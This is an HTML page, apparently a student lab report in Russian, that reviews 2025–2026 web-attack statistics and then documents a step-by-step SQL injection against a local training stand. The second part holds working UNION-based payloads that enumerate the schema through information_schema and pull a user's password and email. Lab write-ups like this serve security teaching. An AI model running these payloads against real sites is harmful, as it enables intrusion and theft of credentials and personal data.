@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Converted from Markdown</title>
+  <style>
+    body { 
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; 
+      line-height: 1.6; 
+      max-width: 800px; 
+      margin: 0 auto; 
+      padding: 20px;
+      color: #333;
+    }
+    h1, h2, h3 { color: #333; margin-top: 1.5em; margin-bottom: 0.5em; }
+    h1 { font-size: 2em; }
+    h2 { font-size: 1.5em; }
+    h3 { font-size: 1.2em; }
+    code { 
+      background: #f4f4f4; 
+      padding: 2px 4px; 
+      border-radius: 3px; 
+      font-family: 'Courier New', monospace;
+    }
+    pre { 
+      background: #f4f4f4; 
+      padding: 15px; 
+      border-radius: 5px; 
+      overflow-x: auto;
+      font-family: 'Courier New', monospace;
+      line-height: 1.4;
+    }
+    blockquote { 
+      border-left: 4px solid #ddd; 
+      margin: 1em 0; 
+      padding-left: 20px; 
+      color: #666;
+      font-style: italic;
+    }
+    table {
+      border-collapse: collapse;
+      width: 100%;
+      margin: 1em 0;
+    }
+    th, td {
+      border: 1px solid #ddd;
+      padding: 8px 12px;
+      text-align: left;
+    }
+    th {
+      background-color: #f5f5f5;
+      font-weight: bold;
+    }
+    ul, ol {
+      margin: 1em 0;
+      padding-left: 2em;
+    }
+    li {
+      margin: 0.5em 0;
+    }
+  </style>
+</head>
+<body>
+<h2>Содержание</h2>
+<ol>
+<li><a href="#%D0%B2%D0%B2%D0%B5%D0%B4%D0%B5%D0%BD%D0%B8%D0%B5">Введение</a></li>
+<li><a href="#%D1%87%D0%B0%D1%81%D1%82%D1%8C-i-%D0%B0%D0%BD%D0%B0%D0%BB%D0%B8%D1%82%D0%B8%D1%87%D0%B5%D1%81%D0%BA%D0%B8%D0%B9-%D0%BE%D0%B1%D0%B7%D0%BE%D1%80-%D1%81%D1%82%D0%B0%D1%82%D0%B8%D1%81%D1%82%D0%B8%D0%BA%D0%B8-20252026-%D0%B3%D0%B3">Часть I. Аналитический обзор статистики (2025–2026 гг.)</a><ul>
+<li><a href="#1-%D0%B8%D1%81%D1%82%D0%BE%D1%87%D0%BD%D0%B8%D0%BA%D0%B8-%D0%B4%D0%B0%D0%BD%D0%BD%D1%8B%D1%85">1. Источники данных</a></li>
+<li><a href="#2-%D0%B4%D0%BE%D0%BB%D1%8F-%D1%83%D1%81%D0%BF%D0%B5%D1%88%D0%BD%D1%8B%D1%85-%D0%B0%D1%82%D0%B0%D0%BA-%D1%87%D0%B5%D1%80%D0%B5%D0%B7-%D0%B2%D0%B5%D0%B1-%D1%83%D1%8F%D0%B7%D0%B2%D0%B8%D0%BC%D0%BE%D1%81%D1%82%D0%B8">2. Доля успешных атак через веб-уязвимости</a></li>
+<li><a href="#3-%D0%BE%D1%82%D1%80%D0%B0%D1%81%D0%BB%D0%B5%D0%B2%D0%BE%D0%B5-%D1%80%D0%B0%D1%81%D0%BF%D1%80%D0%B5%D0%B4%D0%B5%D0%BB%D0%B5%D0%BD%D0%B8%D0%B5-%D0%B2%D0%B5%D0%B1-%D0%B0%D1%82%D0%B0%D0%BA">3. Отраслевое распределение веб-атак</a></li>
+<li><a href="#4-%D1%80%D0%B0%D1%81%D0%BF%D1%80%D0%B5%D0%B4%D0%B5%D0%BB%D0%B5%D0%BD%D0%B8%D0%B5-%D0%BF%D0%BE-%D0%BA%D0%BE%D0%BD%D0%BA%D1%80%D0%B5%D1%82%D0%BD%D1%8B%D0%BC-%D1%83%D1%8F%D0%B7%D0%B2%D0%B8%D0%BC%D0%BE%D1%81%D1%82%D1%8F%D0%BC-owasp-top-10-2025">4. Распределение по конкретным уязвимостям (OWASP Top 10 2025)</a></li>
+</ul>
+</li>
+<li><a href="#%D1%87%D0%B0%D1%81%D1%82%D1%8C-ii-%D0%BF%D1%80%D0%B0%D0%BA%D1%82%D0%B8%D1%87%D0%B5%D1%81%D0%BA%D0%B0%D1%8F-%D1%8D%D0%BA%D1%81%D0%BF%D0%BB%D1%83%D0%B0%D1%82%D0%B0%D1%86%D0%B8%D1%8F-sql-%D0%B8%D0%BD%D1%8A%D0%B5%D0%BA%D1%86%D0%B8%D1%8F">Часть II. Практическая эксплуатация (SQL-инъекция)</a><ul>
+<li><a href="#1-%D1%80%D0%B0%D0%B7%D0%B2%D0%B5%D0%B4%D0%BA%D0%B0-%D0%B8-%D1%84%D0%B0%D0%B7%D0%B7%D0%B8%D0%BD%D0%B3">1. Разведка и фаззинг</a></li>
+<li><a href="#2-%D0%BE%D0%BF%D1%80%D0%B5%D0%B4%D0%B5%D0%BB%D0%B5%D0%BD%D0%B8%D0%B5-%D1%80%D0%B0%D0%B7%D0%BC%D0%B5%D1%80%D0%BD%D0%BE%D1%81%D1%82%D0%B8-%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81%D0%B0">2. Определение размерности запроса</a></li>
+<li><a href="#3-%D0%B8%D0%B7%D0%B2%D0%BB%D0%B5%D1%87%D0%B5%D0%BD%D0%B8%D0%B5-%D0%BC%D0%B5%D1%82%D0%B0%D0%B4%D0%B0%D0%BD%D0%BD%D1%8B%D1%85">3. Извлечение метаданных</a></li>
+<li><a href="#4-%D1%84%D0%B8%D0%BD%D0%B0%D0%BB%D1%8C%D0%BD%D0%B0%D1%8F-%D1%8D%D0%BA%D1%81%D0%BF%D0%BB%D1%83%D0%B0%D1%82%D0%B0%D1%86%D0%B8%D1%8F-%D0%B8-%D0%BE%D1%82%D0%B2%D0%B5%D1%82%D1%8B">4. Финальная эксплуатация и ответы</a></li>
+</ul>
+</li>
+<li><a href="#%D0%B7%D0%B0%D0%BA%D0%BB%D1%8E%D1%87%D0%B5%D0%BD%D0%B8%D0%B5">Заключение</a>\</li>
+</ol>
+<h2>Введение</h2>
+<p>Краткий анализ статистики веб-уязвимостей за 2025–2026 гг. и задокументированный протокол практической эксплуатации уязвимости SQL-инъекции (в формате «черного ящика»).</p>
+<h2>Часть I. Аналитический обзор статистики (2025–2026 гг.)</h2>
+<h3>1. Источники данных</h3>
+<p>Анализ базируется на глобальных и российских исследованиях за 2025–2026 годы:</p>
+<ul>
+<li><a href="https://www.verizon.com/business/resources/T16f/reports/2025-dbir-data-breach-investigations-report.pdf">Verizon DBIR 2025</a></li>
+<li><a href="https://ptsecurity.com/research/analytics/aktual-nye-kiberugrozy-i-ii-kvartaly-2025-goda/">Positive Technologies 2025</a></li>
+<li><a href="https://owasp.org/Top10/2025/">OWASP Top 10: 2025</a></li>
+<li><a href="https://rt-solar.ru/events/news/6359/">Solar 4RAYS</a> </li>
+<li><a href="https://bi.zone/news/prognozy-po-razvitiyu-kiberlandshafta-predstavili-v-threat-zone-2026/">BI.ZONE Threat Zone 2026</a> </li>
+<li><a href="https://lp.kaspersky.com/global/ksb2025/">Kaspersky Security Bulletin 2025</a></li>
+<li><a href="https://www.ibm.com/reports/threat-intelligence">IBM X-Force 2026</a> </li>
+<li><a href="https://www.checkpoint.com/security-report/">Check Point Security Report 2026</a></li>
+</ul>
+<h3>2. Доля успешных атак через веб-уязвимости</h3>
+<ul>
+<li><strong>Глобальный уровень (Verizon 2025):</strong> <strong>12%</strong> всех утечек составили прямые веб-атаки. Эксплуатация уязвимостей как начальный вектор доступа достигла <strong>20%</strong>.</li>
+<li><strong>Глобальный уровень (IBM X-Force 2026):</strong> Эксплуатация публично доступных приложений выросла на <strong>44%</strong>, при этом <strong>56%</strong> уязвимостей не требовали аутентификации.</li>
+<li><strong>Россия и СНГ (Positive Technologies):</strong> Эксплуатация уязвимостей привела к <strong>31%</strong> успешных атак на организации.</li>
+<li><strong>Россия (Solar 4RAYS):</strong> В 2025 году количество веб-уязвимостей выросло в <strong>3,2 раза</strong>, <strong>4%</strong> из них имели максимальный уровень критичности (CVSS 10.0).</li>
+</ul>
+<h3>3. Отраслевое распределение веб-атак</h3>
+<table>
+<thead>
+<tr>
+<th align="left">Отрасль</th>
+<th align="left">Доля атак</th>
+<th align="left">Основная мотивация / Причины</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>Транспорт и логистика</strong></td>
+<td align="left">47% (Solar) / 10% (BI.ZONE)</td>
+<td align="left">Автоматизация цепочек поставок и уязвимые публичные API.</td>
+</tr>
+<tr>
+<td align="left"><strong>Государственный сектор</strong></td>
+<td align="left">21% (PT) / 14% (BI.ZONE)</td>
+<td align="left">Политический хактивизм (16%) и кибершпионаж (37%).</td>
+</tr>
+<tr>
+<td align="left"><strong>E-commerce и Ритейл</strong></td>
+<td align="left">17% (Solar) / 10% (BI.ZONE)</td>
+<td align="left">Кража платежных и персональных данных.</td>
+</tr>
+<tr>
+<td align="left"><strong>Промышленность</strong></td>
+<td align="left">13% (PT)</td>
+<td align="left">Атаки на SCADA-системы и интегрированные интерфейсы.</td>
+</tr>
+<tr>
+<td align="left"><strong>Финансовый сектор</strong></td>
+<td align="left">11% (BI.ZONE)</td>
+<td align="left">Взлом через компрометацию подрядчиков.</td>
+</tr>
+</tbody></table>
+<h3>4. Распределение по конкретным уязвимостям (OWASP Top 10 2025)</h3>
+<ul>
+<li><strong>A01: Broken Access Control</strong> (Охват 42.9%): Абсолютный лидер. Включает IDOR и SSRF.</li>
+<li><strong>A02: Security Misconfiguration</strong> (Охват 52.3%): Небезопасные настройки по умолчанию, открытые облачные бакеты.</li>
+<li><strong>A03: Software Supply Chain Failures:</strong> Компрометация сторонних библиотек и CI/CD процессов.</li>
+<li><strong>A04: Cryptographic Failures:</strong> Слабое хеширование и отсутствие HTTPS.</li>
+<li><strong>A05: Injection:</strong> SQL, NoSQL инъекции (остаются актуальными для legacy-систем).</li>
+</ul>
+<blockquote>
+<p><strong>Новый вектор (AI-сервисы):</strong> Check Point зафиксировал, что <strong>90%</strong> организаций столкнулись с рисками ИИ-промптов (Prompt Injection). Solar 4RAYS выделяет <strong>5%</strong> всех новых уязвимостей в AI-решениях из-за генерации кода нейросетями без аудита («вайбкодинга»).</p>
+</blockquote>
+<h2>Часть II. Практическая эксплуатация (SQL-инъекция)</h2>
+<p><strong>Целевой стенд:</strong> <code>http://localhost:8080/task/</code></p>
+<h3>1. Разведка и фаззинг</h3>
+<ul>
+<li><strong>Легитимный ввод:</strong> Параметр <code>id</code> определяет вывод. <ul>
+<li><code>id=1</code> (admin), <code>id=4</code> (Vinni-pukh), <code>id=9</code> (Volk2).</li>
+</ul>
+</li>
+<li><strong>Поиск уязвимости:</strong> 
+Запрос <code>?id=1&#39;</code> возвращает фатальную ошибку: <code>You have an error in your SQL syntax... near &#39;&#39;1&#39;&#39;&#39;</code>. Это подтверждает отсутствие санитизации и указывает на СУБД MySQL.</li>
+<li><strong>Логическая инъекция:</strong> 
+<code>?id=1&#39; OR 1=1--+</code> выполняется, но выдает только первую запись (admin), так как backend запрашивает лишь одну строку. Необходим <code>UNION SELECT</code>.</li>
+</ul>
+<h3>2. Определение размерности запроса</h3>
+<p>Требуется узнать количество колонок оригинального запроса с помощью <code>ORDER BY</code>:</p>
+<pre><code class="language-sql">?id=1&#39; ORDER BY 3--+ /* Успех */
+?id=1&#39; ORDER BY 4--+ /* Ошибка */
+</code></pre>
+<p><strong>Вывод:</strong> Используется 3 столбца. Смещаем вывод ложным ID: <code>?id=-1&#39; UNION SELECT 1,2,3--+</code> (на странице выводятся позиции 1 и 2).</p>
+<h3>3. Извлечение метаданных</h3>
+<ul>
+<li><strong>Имя базы данных:</strong></li>
+</ul>
+<pre><code class="language-sql">  ?id=-1&#39; UNION SELECT 1,database(),3--+ 
+</code></pre>
+<p>  <em>Результат:</em> <code>security</code></p>
+<ul>
+<li><strong>Таблицы:</strong> <pre><code class="language-sql">?id=-1&#39; UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=&#39;security&#39;--+ 
+</code></pre>
+<em>Результат:</em> <code>emails, users</code></li>
+<li><strong>Структура таблиц:</strong><ul>
+<li>Колонки <code>users</code>: <code>id</code>, <code>username</code>, <code>password</code></li>
+<li>Колонки <code>emails</code>: <code>id</code>, <code>email_id</code></li>
+</ul>
+</li>
+</ul>
+<h3>4. Финальная эксплуатация и ответы</h3>
+<p><strong>Задание 1: Пароль пользователя Volk2 (id=9)</strong></p>
+<pre><code class="language-sql">?id=-1&#39; UNION SELECT 1,password,3 FROM users WHERE username=&#39;Volk2&#39;--+
+</code></pre>
+<ul>
+<li><strong>Ответ:</strong> Пароль пользователя Volk2 — <code>Wa spoiuuuuu</code>.</li>
+</ul>
+<p><strong>Задание 2: Почта пользователя Vinni-pukh (id=4)</strong></p>
+<ul>
+<li><em>Ошибочная попытка:</em> Поиск по имени <code>WHERE username=&#39;Vinni-pukh&#39;</code> в таблице <code>emails</code> вызывает ошибку (нет такого столбца, связь идет по <code>id</code>).</li>
+<li><em>Успешный запрос:</em></li>
+</ul>
+<pre><code class="language-sql">?id=-1&#39; UNION SELECT 1,email_id,3 FROM emails WHERE id=4--+
+</code></pre>
+<ul>
+<li><strong>Ответ:</strong> Почта пользователя Vinni-pukh — <code>honey_lover@otus-lab.com</code>.</li>
+</ul>
+<h2>Заключение</h2>
+<p>Аналитика 2025–2026 гг. фиксирует рост атак на цепочки поставок и AI-сервисы, однако классические уязвимости фильтрации (OWASP A05 - Injection) всё еще остаются критичным вектором. Практическая часть доказала, что отсутствие параметризации запросов позволяет тривиально извлечь схему БД и эксфильтровать учетные данные (пароли и email).</p>
+
+</body>
+</html>
